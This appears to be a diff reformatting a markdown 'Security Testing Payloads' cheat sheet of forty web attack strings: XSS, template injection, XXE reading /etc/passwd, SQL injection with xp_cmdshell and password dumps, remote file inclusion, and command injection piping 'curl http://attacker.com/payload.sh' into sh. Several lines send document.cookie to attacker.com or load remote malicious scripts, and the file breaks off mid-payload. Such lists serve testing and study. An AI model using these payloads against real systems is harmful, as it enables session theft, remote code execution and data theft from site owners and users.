@@ -1,221 +1,220 @@
 # Security Testing Payloads
 
-## 1. Obfuscation Techniques
-```html
+1. Obfuscation Techniques
+-------------------------
+
 <script>eval(String.fromCharCode(104, 97, 99, 107, 40, 39, 88, 83, 83, 39))</script>
 <script>document.location="javascript:alert(1)"</script> <!-- Direct JS execution via URL -->
 <script>document.body.appendChild(document.createElement('script')).src='http://attacker.com/malicious.js'</script>
 document.getElementsByTagName('body')[0].innerHTML = "<script>alert(1)</script>";
-```
 
-## 2. Header-based Attacks
-```plaintext
+2. Header-based Attacks
+-------------------------
+
 X-Custom-Header: <script>document.write('<img src=x onerror=alert(1)>')</script>
 X-Frame-Options: ALLOW-FROM http://attacker.com; <script>alert('XSS')</script>
 Accept-Language: <script>alert('Language header XSS')</script>
-```
 
-## 3. Time-based Payloads
-```html
+3. Time-based Payloads
+-------------------------
+
 <script>setTimeout(() => { fetch('http://attacker.com/steal?cookie=' + document.cookie) }, 10000);</script>
 <img src="x" onerror="setInterval(() => { alert('Persistent XSS') }, 5000);">
 WAITFOR DELAY '00:00:10'; --
-```
 
-## 4. Content Injection
-```html
+4. Content Injection
+-------------------------
+
 <iframe src="javascript:alert('XSS');" style="display:none;"></iframe> <!-- Abusing iframe src -->
 <svg><script>fetch('http://attacker.com/steal?data=' + document.cookie)</script></svg>
 <style>@keyframes x { from { opacity: 0; } to { opacity: 1; } } body { animation: x 1s forwards; }</style><script>if (document.body.style.opacity === '1') alert('XSS');</script>
-```
 
-## 5. Cross-Site Scripting (XSS)
-```html
+5. Cross-Site Scripting (XSS)
+-------------------------
+
 GET /search?input=<img src=x onerror=alert(document.domain)>
 <svg><g onmouseover="alert(1)"></g></svg> <!-- Event-based XSS -->
 <script>document.write('<img src=x onerror=alert("XSS") />')</script> <!-- Dynamic script injection -->
-```
 
-## 6. Server-Side Attacks
-```plaintext
+6. Server-Side Attacks
+-------------------------
+
 {{ config.get('path.to.secret') | b64decode | system }} <!-- For Flask/Jinja2 -->
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><test>&xxe;</test></root> <!-- XXE with payload retrieval -->
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }} <!-- Python template injection -->
-```
 
-## 7. SQL Injection
-```sql
+7. SQL Injection
+-------------------------
+
 SELECT * FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
 {"$where": "this.username.match(/admin/) && this.password.match(/.*/)"} <!-- MongoDB injection -->
 '; EXEC xp_cmdshell('ping attacker.com'); -- <!-- SQL Server command execution -->
-```
 
-## 8. Logic Flaws
-```plaintext
+8. Logic Flaws
+-------------------------
+
 GET /profile?username=admin&data=<script>alert('XSS')</script> <!-- Abusing user input -->
 POST /api/v1/update HTTP/1.1 Content-Type: application/json; { "key": "<script>alert('XSS')</script>" }
-```
 
-## 9. Bypasses and Evasion
-```html
+9. Bypasses and Evasion
+-------------------------
+
 <img src=x onerror='alert(XSS)' style="display:none;"> <!-- CSS property manipulation -->
 %3Cscript%3Ealert%281%29%3C%2Fscript%3E <!-- Double encoding -->
 User-Agent: ' OR '1'='1'; -- <!-- Classic SQL injection in user agent -->
-```
 
-## 10. Miscellaneous Techniques
-```plaintext
+10. Miscellaneous Techniques
+-------------------------
+
 GET /index.php?id=<script>alert('XSS')</script>&action=view
 curl -H "X-Forwarded-For: <?php system('cat /etc/passwd'); ?>" http://victim.com
 O:8:"stdClass":1:{s:4:"file";s:13:"/etc/passwd";} <!-- Object injection -->
-```
 
-## 11. Dynamic Payload Execution
-```html
+11. Dynamic Payload Execution
+-------------------------
+
 <script>fetch('http://attacker.com?data=' + btoa(document.cookie));</script>
-```
 
-## 12. Self-Executing Code
-```html
+12. Self-Executing Code
+-------------------------
+
 <script>!function(){alert('XSS')}();</script>
-```
 
-## 13. Custom Protocol Injection
-```plaintext
+13. Custom Protocol Injection
+-------------------------
+
 Referer: javascript:alert(document.domain)
-```
 
-## 14. Combining Headers for Bypass
-```plaintext
+14. Combining Headers for Bypass
+-------------------------
+
 X-Requested-With: XMLHttpRequest; <script>alert('Bypass')</script>
-```
 
-## 15. Chained Time-Based Exploit
-```html
+15. Chained Time-Based Exploit
+-------------------------
+
 <script>setTimeout(function(){document.body.appendChild(document.createElement('script')).src='http://attacker.com/malicious.js';}, 5000);</script>
-```
 
-## 16. Using SVG with Event Listeners
-```html
+16. Using SVG with Event Listeners
+-------------------------
+
 <svg onload='this.getElementsByTagName("script")[0].remove()'><script>alert("XSS")</script></svg>
-```
 
-## 17. Data URI with a Remote Script
-```html
+17. Data URI with a Remote Script
+-------------------------
+
 <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">
-```
 
-## 18. Event Handlers with Inline Scripts
-```html
+18. Event Handlers with Inline Scripts
+-------------------------
+
 <div onmouseover="this.innerHTML='<img src=x onerror=alert(1)>'">Hover me</div>
-```
 
-## 19. Form Submission XSS
-```html
+19. Form Submission XSS
+-------------------------
+
 <form action="http://victim.com" method="GET"><input type="text" name="data" value='<script>alert(1)</script>'></form>
-```
 
-## 20. Server-Side Template Injection (SSTI)
-```plaintext
-{{ config.items()|join('') }}  # For Flask/Jinja2
-```
+20. Server-Side Template Injection (SSTI)
+-------------------------
 
-## 21. Using PHP Object Injection
-```plaintext
-O:8:"stdClass":1:{s:4:"file";s:13:"/etc/passwd";}
-```
-
-## 22. Using Time Delay to Bypass WAF
-```sql
-' OR IF(1=1, SLEEP(5), 0) -- 
-```
-
-## 23. Leveraging Union-based Attacks
-```sql
-UNION SELECT NULL, CONCAT(username, ':', password) FROM users -- 
-```
-
-## 24. DOM Manipulation for Logic Flaws
-```html
-<script>document.getElementById('submit').onclick=function(){alert('XSS');}</script>
-```
-
-## 25. URL Encoding with WAF Bypass
-```html
-%3Cscript%3Ealert%281%29%3C%2Fscript%3E
-```
-
-## 26. Use of CSS Expressions (only works in IE)
-```html
-<style>div{width: expression(alert('XSS'))}</style>
-```
-
-## 27. Remote File Inclusion (if applicable)
-```php
-/index.php?page=http://attacker.com/malicious.php
-```
-
-## 28. Command Injection via GET
-```bash
-/index.php?cmd=;curl http://attacker.com/payload.sh | sh
-```
-
-## 29. Dynamic Obfuscation Techniques
-```html
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA... onload='fetch(`http://attacker.com?cookie=${btoa(document.cookie)}`)'>
-```
-
-## 30. Dynamic Function Execution
-```html
-<script>String.prototype.s=eval; s('alert(1)');</script>
-```
-
-## 31. Custom Headers with JavaScript
-```plaintext
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) <script>fetch('http://attacker.com');</script>
-```
-
-## 32. Referer with Malicious Intent
-```plaintext
-Referer: javascript:alert('Bypass')
-```
-
-## 33. JavaScript Event Delegation
-```html
-<div onclick="this.innerHTML='<script>alert(1)</script>'">Click me</div>
-```
-
-## 34. Combining Multiple Attacks
-```html
-<svg onload='fetch(`http://attacker.com?cookie=${document.cookie}`)'></svg>
-```
-
-## 35. CSS Expression Attack (IE Specific)
-```html
-<style>div { width: expression(alert('XSS')); }</style>
-```
-
-## 36. CSS with Data URI
-```html
-<style>@import 'data:text/css,<style>body{background:url("http://attacker.com");}</style>';</style>
-```
-
-## 37. JSON with XSS
-```json
-{"key":"<script>alert('XSS')</script>"}
-```
-
-## 38. Manipulating JSONP
-```html
-<script src="http://victim.com/callback?data=<script>alert('XSS')</script>"></script>
-```
-
-## 39. SSTI with Python
-```jinja
 {{ config['SECRET_KEY'] }}
-```
 
-## 40. RCE with PHP Object Injection
-```php
+21. Using PHP Object Injection
+-------------------------
+
+O:8:"stdClass":1:{s:4:"file";s:13:"/etc/passwd";}
+
+22. Using Time Delay to Bypass WAF
+-------------------------
+
+' OR IF(1=1, SLEEP(5), 0) -- 
+
+23. Leveraging Union-based Attacks
+-------------------------
+
+UNION SELECT NULL, CONCAT(username, ':', password) FROM users -- 
+
+24. DOM Manipulation for Logic Flaws
+-------------------------
+
+<script>document.getElementById('submit').onclick=function(){alert('XSS');}</script>
+
+25. URL Encoding with WAF Bypass
+-------------------------
+
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+26. Use of CSS Expressions (only works in IE)
+-------------------------
+
+<style>div{width: expression(alert('XSS'))}</style>
+
+27. Remote File Inclusion (if applicable)
+-------------------------
+
+/index.php?page=http://attacker.com/malicious.php
+
+28. Command Injection via GET
+-------------------------
+
+/index.php?cmd=;curl http://attacker.com/payload.sh | sh
+
+29. Dynamic Obfuscation Techniques
+-------------------------
+
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA... onload='fetch(`http://attacker.com?cookie=${btoa(document.cookie)}`)'> 
+
+30. Dynamic Function Execution
+-------------------------
+
+<script>String.prototype.s=eval; s('alert(1)');</script>
+
+31. Custom Headers with JavaScript
+-------------------------
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) <script>fetch('http://attacker.com');</script>
+
+32. Referer with Malicious Intent
+-------------------------
+
+Referer: javascript:alert('Bypass')
+
+33. JavaScript Event Delegation
+-------------------------
+
+<div onclick="this.innerHTML='<script>alert(1)</script>'">Click me</div>
+
+34. Combining Multiple Attacks
+-------------------------
+
+<svg onload='fetch(`http://attacker.com?cookie=${document.cookie}`)'></svg>
+
+35. CSS Expression Attack (IE Specific)
+-------------------------
+
+<style>div { width: expression(alert('XSS')); }</style>
+
+36. CSS with Data URI
+-------------------------
+
+<style>@import 'data:text/css,<style>body{background:url("http://attacker.com");}</style>';</style>
+
+37. JSON with XSS
+-------------------------
+
+{"key":"<script>alert('XSS')</script>"}
+
+38. Manipulating JSONP
+-------------------------
+
+<script src="http://victim.com/callback?data=<script>alert('XSS')</script>"></script>
+
+39. SSTI with Python
+-------------------------
+
+{{ config['SECRET_KEY'] }}
+
+40. RCE with PHP Object Injection
+-------------------------
 O:8:"stdClass":1:{
-```
